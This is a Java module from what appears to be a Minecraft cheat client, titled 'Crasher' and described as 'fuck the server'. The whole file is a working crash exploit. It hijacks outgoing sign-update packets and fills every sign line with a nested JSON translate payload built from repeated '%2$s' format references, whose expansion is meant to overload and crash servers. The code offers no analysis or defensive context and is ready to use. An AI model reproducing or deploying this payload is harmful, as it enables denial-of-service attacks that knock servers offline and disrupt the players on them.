package dev.hacksoar.modules.impl.utilty;

import dev.hacksoar.api.events.EventTarget;
import dev.hacksoar.api.events.impl.EventSendPacket;
import dev.hacksoar.api.tags.ModuleTag;
import dev.hacksoar.modules.Module;
import dev.hacksoar.modules.ModuleCategory;
import dev.hacksoar.utils.player.PacketUtil;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C12PacketUpdateSign;
import net.minecraft.util.IChatComponent;

@ModuleTag
public class Crasher extends Module {
    private final String TEXT = "{\n" +
            "  \"translate\": \"%2$s%2$s%2$s%2$s%2$s\",\n" +
            "  \"with\": [\n" +
            "    \"\",\n" +
            "    {\n" +
            "      \"translate\": \"%2$s%2$s%2$s%2$s%2$s\",\n" +
            "      \"with\": [\n" +
            "        \"\",\n" +
            "        {\n" +
            "          \"translate\": \"%2$s%2$s%2$s%2$s%2$s\",\n" +
            "          \"with\": [\n" +
            "            \"\",\n" +
            "            {\n" +
            "              \"translate\": \"%2$s%2$s%2$s%2$s%2$s\",\n" +
            "              \"with\": [\n" +
            "                \"\",\n" +
            "                {\n" +
            "                  \"translate\": \"%2$s%2$s%2$s%2$s\",\n" +
            "                  \"with\": [\n" +
            "                    \"\",\n" +
            "                    {\n" +
            "                      \"translate\": \"%2$s%2$s%2$s%2$s\",\n" +
            "                      \"with\": [\n" +
            "                        \"\",\n" +
            "                        {\n" +
            "                          \"translate\": \"%2$s%2$s%2$s%2$s\",\n" +
            "                          \"with\": [\n" +
            "                            \"Ez crashed\",\n" +
            "                            \"Ez crashed\"\n" +
            "                          ]\n" +
            "                        }\n" +
            "                      ]\n" +
            "                    }\n" +
            "                  ]\n" +
            "                }\n" +
            "              ]\n" +
            "            }\n" +
            "          ]\n" +
            "        }\n" +
            "      ]\n" +
            "    }\n" +
            "  ]\n" +
            "}";

    public Crasher() {
        super("Crasher", "fuck the server", ModuleCategory.Util);
    }

    @EventTarget
    public void onPacket(EventSendPacket event) {
        Packet<?> packet = event.getPacket();

        if (packet instanceof C12PacketUpdateSign) {
            IChatComponent[] components = new IChatComponent[]{
                    IChatComponent.Serializer.jsonToComponent(TEXT),
                    IChatComponent.Serializer.jsonToComponent(TEXT),
                    IChatComponent.Serializer.jsonToComponent(TEXT),
                    IChatComponent.Serializer.jsonToComponent(TEXT)
            };
            PacketUtil.sendNoEvent(new C12PacketUpdateSign(((C12PacketUpdateSign) packet).getPosition(), components));
            event.setCancelled(true);
        }
    }
}
